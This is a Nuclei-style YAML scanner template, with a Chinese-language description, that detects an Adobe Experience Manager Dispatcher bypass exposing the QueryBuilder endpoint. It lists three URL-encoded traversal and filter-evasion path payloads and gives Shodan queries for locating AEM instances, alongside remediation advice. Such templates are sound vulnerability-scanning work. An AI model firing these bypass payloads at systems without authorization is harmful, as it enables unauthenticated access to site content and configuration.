id: aem-dispatcher-bypass

info:
  name: Adobe Experience Manager Dispatcher Bypass 检测
  author: DhiyaneshDK,assetnote
  severity: medium
  description: |
    该模板用于核查 Adobe Experience Manager Dispatcher Bypass相关配置。该类问题通常源于管理端、API、控制台或调试接口缺少认证授权，导致未登录用户可直接访问敏感功能。模板会向目标发送探测请求，并依据请求 `{{paths}}`、匹配 `"success":true`、`"results":`、状态码 200 等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可在未授权状态下查看系统状态、任务信息、配置数据或业务内容。
    - 若接口允许执行操作，可能进一步导致配置被修改、任务被触发、数据被导出或服务被接管。
  remediation: |
    - 为相关管理入口和 API 增加强认证、细粒度授权与访问审计。
    - 限制控制台、调试页和内部服务的公网访问，仅允许可信网络或堡垒机访问。
    - 排查访问日志，确认是否存在未授权访问、异常操作或批量枚举行为。
  reference:
    - https://docs.google.com/presentation/d/1PypHgd0r3ZVII7e5fLX5JjZIJQfAsMEydLnug0yFb9k/edit?usp=sharing (Slide 18,22,24)
  metadata:
    verified: true
    max-request: 1
    vendor: adobe
    product: experience_manager
    shodan-query:
      - http.title:"aem sign in"
      - http.component:"adobe experience manager"
      - cpe:"cpe:2.3:a:adobe:experience_manager"
  tags: adobe,aem,dispatcher

http:
  - raw:
      - |
        GET {{paths}} HTTP/1.1
        Host: {{Hostname}}

    payloads:
      paths:
        - "/graphql/execute.json/..%2f../bin/querybuilder.json"
        - "/bin/querybuilder.json;x='x/.ico/y'"
        - "/bin/querybuilder.json;x='x/graphql/execute/json/y'"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
          - '"results":'
          - '"hits":'
        condition: and

      - type: status
        status:
          - 200
